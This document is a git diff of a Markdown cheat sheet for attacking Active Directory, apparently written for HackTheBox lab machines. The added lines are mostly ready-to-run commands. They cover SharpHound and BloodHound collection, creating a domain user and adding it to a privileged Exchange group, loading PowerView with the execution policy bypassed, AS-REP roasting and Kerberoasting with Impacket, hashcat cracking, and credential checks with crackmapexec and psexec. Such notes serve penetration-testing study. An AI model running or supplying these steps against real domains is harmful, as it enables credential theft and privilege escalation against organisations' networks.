@@ -37,7 +37,28 @@ crackmapexec smb <IP> -u administrator -H <hash>
 psexec.py -hashes <hash> administrator@<IP>
 ```
 
-## Bloodhound
+### Bloodhound
+
+#### Configuration
+
+Run Bloodhound (and neo4j) then import zip file created by Sharphound
+
+```bash
+# Run neo4j first
+sudo neo4j console/start
+# Run Bloodhound
+bloodhound --no-sandbox
+```
+
+#### neo4j
+
+```bash
+# neo4j new password/forgot password
+locate no4j | grep auth
+rm /usr/share/neo4j/data/dbms/auth
+neo4j console
+# Reset password
+```
 
 ### Collection
 
@@ -46,6 +67,14 @@ psexec.py -hashes <hash> administrator@<IP>
 ```bash
 /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
 /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1
+```
+
+```bash
+.\SharpHound.exe -c all
+# Will output a zip file to copy back to Kali
+
+# Running remotely in PowerShell
+.\SharphHound.exe -c all -d active.htb --domaincontroller <IP>
 ```
 
 #### BloodHound.py
@@ -58,9 +87,24 @@ bloodhound-python
 # Command
 bloodhound-python -u <username> -p <password> -ns <IP> -d <domain.local> -c All
 # Copy json output file into Bloodhound
+python3.8 bloodhound.py -ns <IP> -d intelligence.htb -dc dc.intelligence.htb -u <username> -p <password> -c All
+# Start neo4j and upload the output to Bloodhound
 ```
 
 ### Enumeration
+
+```bash
+# After importing, search on what you have owned
+# Ex: search on username, right click and mark as owned
+# Then navigate to Queries and look at Shortest Paths
+# Look at Service accounts/Account Operators which have special permissions create accounts and put htem in different groups
+# Ex: Create new user and add them to a group that has higher permissions; can't be Administrator gourp
+net user <username> <password> /add/ domain
+net group "Exchange Windows Permissions"  # Check for group members
+net group "Exchange Windows Permissions" /add <username>  # Add user to group in quotes
+# Then back in Bloodhound, right click group added (graph line) and look at Abuse Info.
+# Will most likely use PowerView for the Abuse
+```
 
 #### Node Info
 
@@ -74,18 +118,50 @@ bloodhound-python -u <username> -p <password> -ns <IP> -d <domain.local> -c All
 * Find Shortest Paths to Domain Admin
 * Shortest Paths to Domain Admins from Owned Principals
 
+## PowerView
+
+Cheat Sheet - [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
+
+### Setup
+
+```powershell
+# Navigate to the directory PowerView is in
+powershell -ep bypass  # load a powershell shell with execution policy bypassed
+. .\PowerView.ps1  # import the PowerView module
+```
+
+### Example
+
+```powershell
+Get-NetComputer -fulldata | select operatingsystem  # gets a list of all operating systems on the domain
+Get-NetUser | select cn  # gets a list of all users on the domain
+Get-NetGroup  # Get groups
+Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'}  # Get Kerberoastable user from a specified group
+```
+
 ## AS-REP Roasting
 
 > Must have a username or list of usernames to perform
 
 ### GetNPUsers
 
+Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking
+
 ```bash
 # From Kali
+GetNPUsers.py -dc-ip <IP> -request 'htb.local/'
+# Look for user/hash output
+GetNPUsers.py -dc-ip <IP> -request 'htb.local/' -format hashcat  # Put it in hashcat format in prep to crack
+# Hashcat Crack
+hashcat -m 18200 hash.txt rockyou.txt -r rules/InsidePro-PasswordsPro.rule
+
 GetNPUsers.py <domain.local>/<username> -dc-ip=<IP>
 # Look "getting its TGT"
 $krb5asrep$23$<username>@<domain.local>:12345...
-# Then can attempt to brute force offline with John or Hashcat
+# Then can attempt to brute force offline with John/Hashcat or Pass the Hash
+# If cracked...
+crackmapexec smb <IP> -u <user> -p <password>  # Look for Pwn3d!
+crackmapexec smb <IP> -u <user> -p <password> --shares  # Check for SMB shares to access
 ```
 
 ## Kerberoasting
@@ -96,12 +172,14 @@ $krb5asrep$23$<username>@<domain.local>:12345...
 
 ```bash
 # From Kali
-GetUserSPNs -dc-ip <IP> <domain.local>/<compromised username>
+GetUserSPNs.py -dc-ip <IP> <domain.local>/<compromised username>
 # A list of accounts with SPNs should show along with the account name, etc.
-GetUserSPNs -dc-ip <IP> <domain.local>/<compromised username> -request
+GetUserSPNs.py -dc-ip <IP> <domain.local>/<compromised username> -request
+GetUserSPNs.py -dc-ip <IP> active.htb/svc_tgs -request 
 # Look for the hash in the output
 $krb5tgs$23$*<Username>$<domain.local$<domain.local>/<username*>$12345...
-# Then can attempt to brute force offline with John or Hashcat
+# Then can attempt to brute force offline with John/Hashcat or Pass the Hash
+# Finally attempt to login with psexec, evil-winrm, etc.
 ```
 
 ## GPP Credentials
